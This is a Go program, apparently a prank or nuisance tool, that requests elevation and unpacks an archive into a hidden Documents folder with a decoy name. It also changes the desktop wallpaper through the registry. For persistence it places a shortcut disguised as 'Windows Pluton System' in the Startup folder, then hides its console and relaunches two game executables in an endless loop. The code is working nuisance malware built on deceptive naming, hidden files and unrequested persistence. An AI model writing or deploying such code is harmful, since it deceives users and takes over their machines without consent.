package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
	"syscall"

	"github.com/tawesoft/golib/v2/dialog"
	"golang.org/x/sys/windows"
	// github.com/Slimyi/BlackSoulsDesktopFlooder
)

func handle(err error) {
	// Handle errors
	if err != nil {
		panic(err)
	}
}

func moveShortcut(dir string) {
	//err := os.Rename("C:/Documents/syzcaller32.lnk", "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/syzcaller32.lnk")
	// Move the program shortcut to the startup folder for it to launch on startup
	move := exec.Command("cmd.exe", "/c", "move", dir+"\\Windows Pluton System.lnk", "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
	err := move.Run()
	handle(err)
}

func changebg(dirMS string) {
	regedit := exec.Command("cmd.exe", "/c", "echo", "y", "|", "reg", "add", "HKEY_CURRENT_USER\\Control Panel\\Desktop", "/v", "Wallpaper", "/t", "REG_SZ", "/d", dirMS+"\\BtmBs.bmp")
	regupdate := exec.Command("cmd.exe", "/c", "RUNDLL32.EXE", "user32.dll", ",UpdatePerUserSystemParameters")
	err := regedit.Run()
	handle(err)
	err = regupdate.Run()
	handle(err)
}

func opener(dir string) {
	// Hide the console
	FreeConsole := syscall.NewLazyDLL("kernel32.dll").NewProc("FreeConsole")
	FreeConsole.Call()
	log.Println("\"C:" + dir + "Black Souls/Game.exe\"")
	//cur := true
	// Infinite loop, after BS1 is closed and BS2 is closed BS1 opens again and so on
	for {
		BS1 := exec.Command(dir + "Black Souls/Game.exe")
		BS2 := exec.Command(dir + "Black Souls II/Game.exe")
		err := BS1.Run()
		handle(err)
		err = BS2.Run()
		handle(err)
	}
}

func main() {
	var install bool
	if stat, err := os.Stat("C:\\Program Files (x86)\\Common Files\\Enterbrain\\RGSS3\\RPGVXAce"); err != nil {
		fmt.Println(stat.Size())
		install, _ = dialog.Ask("RPG VX Ace is not installed. Install it?", "I already have RPG VX Ace installed.")
		if install {
			exec.Command("./RPG Maker Runtime Package/Setup.exe").Run()
			os.Exit(0)
		}
	}

	// Get user name
	var stdout bytes.Buffer
	userCom := exec.Command("cmd.exe", "/c", "echo", "%username%")
	userCom.Stdout = &stdout
	err := userCom.Run()
	dir := "C:/Users/" + stdout.String()[:len(stdout.String())-2] + "/Documents/Supersecretminecraftserver/"
	dirMS := "C:\\Users\\" + stdout.String()[:len(stdout.String())-2] + "\\Documents\\Supersecretminecraftserver"
	handle(err)
	// Check if BS already installed
	if _, err = os.Stat(dir); err == nil {
		// If it does already exist, go straight to opener, most of the time this happens on startup
		opener(dir)
	} else {
		if !amEscalated() {
			escalate()
		} else {
			// Make the documents dir in C:/
			err = os.Mkdir(dir, os.ModeDir)
			handle(err)
			log.Println("Instaliation start")
			// Read the programdata archive
			r, err := zip.OpenReader("programdata")
			handle(err)
			defer r.Close()
			// Loop through the files of the archive
			for i, f := range r.File {
				fmt.Printf("Unpacking %d/%d...\n", i, len(r.File)-1)
				// Turn off output so program doesnt print the names of the files
				/*stdoutHold := os.Stdout
				os.Stdout = nil*/

				rc, err := f.Open()
				handle(err)
				// Write the files into the docs dir
				file, err := io.ReadAll(rc)
				if _, err := os.Stat(dir + f.Name); err != nil {
					if f.FileInfo().IsDir() {
						err = os.Mkdir(dir+f.Name, os.ModeDir)
					} else {
						err = os.WriteFile(dir+f.Name, file, os.ModePerm)
					}
				}
				handle(err)
				// Turn on output again and start the loop over
				//os.Stdout = stdoutHold
			}
			log.Println("Install success!")
			changebg(dirMS)
			hide := exec.Command("cmd", "/c", "attrib", "+h", dirMS)
			err = hide.Run()
			handle(err)
			moveShortcut(dirMS)
			// Open the gamezies loop
			opener(dir)
		}

	}
}

// Shamelessly stolen code below

func amEscalated() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func escalate() {
	verb := "runas"
	exe, _ := os.Executable()
	cwd, _ := os.Getwd()
	args := strings.Join(os.Args[1:], " ")

	verbPtr, _ := syscall.UTF16PtrFromString(verb)
	exePtr, _ := syscall.UTF16PtrFromString(exe)
	cwdPtr, _ := syscall.UTF16PtrFromString(cwd)
	argPtr, _ := syscall.UTF16PtrFromString(args)

	var showCmd int32 = 1 //SW_NORMAL

	err := windows.ShellExecute(0, verbPtr, exePtr, argPtr, cwdPtr, showCmd)
	if err != nil {
		fmt.Println(err)
	}
}
